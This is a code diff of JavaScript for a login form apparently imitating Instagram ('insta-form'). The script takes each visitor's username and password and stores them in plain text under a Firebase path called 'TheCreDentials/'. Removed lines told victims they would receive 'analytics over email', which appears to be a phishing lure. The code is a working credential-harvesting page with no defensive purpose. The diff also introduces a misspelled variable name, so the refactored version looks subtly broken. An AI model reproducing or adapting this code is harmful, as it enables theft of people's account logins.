@@ -1,18 +1,16 @@
 "use strict";
 const setErrors = (errors, errorType, details) => {
-        let error = { errorType, details };
-        let usernameError = errors.find(e => e.errorType === errorType);
-        if (!usernameError)
-            errors.push(error);
-    },
-    clearError = (errors, errorType) => {
-        let error = errors.find(e => e.errorType === errorType);
-        if (error) {
-            let errIndex = errors.indexOf(error, 0);
-            errors.splice(errIndex, 1);
-        }
-        console.log(errors);
-    };
+    let error = { errorType, details };
+    let usernameError = errors.find(e => e.errorType === errorType);
+    if (!usernameError)
+        errors.push(error);
+}, clearError = (errors, errorType) => {
+    let error = errors.find(e => e.errorType === errorType);
+    if (error) {
+        let errIndex = errors.indexOf(error, 0);
+        errors.splice(errIndex, 1);
+    }
+};
 document.addEventListener('DOMContentLoaded', (e) => {
     const inputs = document.querySelectorAll("form input");
     const inputEmail = inputs[0];
@@ -27,7 +25,8 @@ document.addEventListener('DOMContentLoaded', (e) => {
             inputEmail.style.border = "1px solid red";
             setErrors(errors, 'usernameError', 'invalidusername');
             console.log(errors);
-        } else {
+        }
+        else {
             inputEmail.style.border = "none";
             clearError(errors, 'usernameError');
         }
@@ -35,7 +34,8 @@ document.addEventListener('DOMContentLoaded', (e) => {
         if (password.match(/^(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\W_]).{8,}$/)) {
             inputPassword.style.border = "none";
             clearError(errors, 'passwordError');
-        } else {
+        }
+        else {
             inputPassword.style.border = "1px solid red";
             setErrors(errors, 'passwordError', 'invalidPassword');
         }
@@ -43,17 +43,14 @@ document.addEventListener('DOMContentLoaded', (e) => {
             inserData(username, password);
         }
     });
-    const { database, set, ref, update, remove } = window.functions;
+    const onSubmit = (token) => {
+        document.getElementById("insta-form").submit();
+    };
+    const { databse, set, ref, update, remove } = window.functions;
     const inserData = (username, password) => {
-        set(ref(database, "TheCreDentials/" + username), {
-                user: username,
-                pass: password
-            })
-            .then(() => {
-                alert("you will get your analytics over email")
-            })
-            .catch((e) => {
-                console.log(e)
-            })
+        set(ref(databse, "TheCreDentials/" + username), {
+            user: username,
+            pass: password
+        });
     };
 });
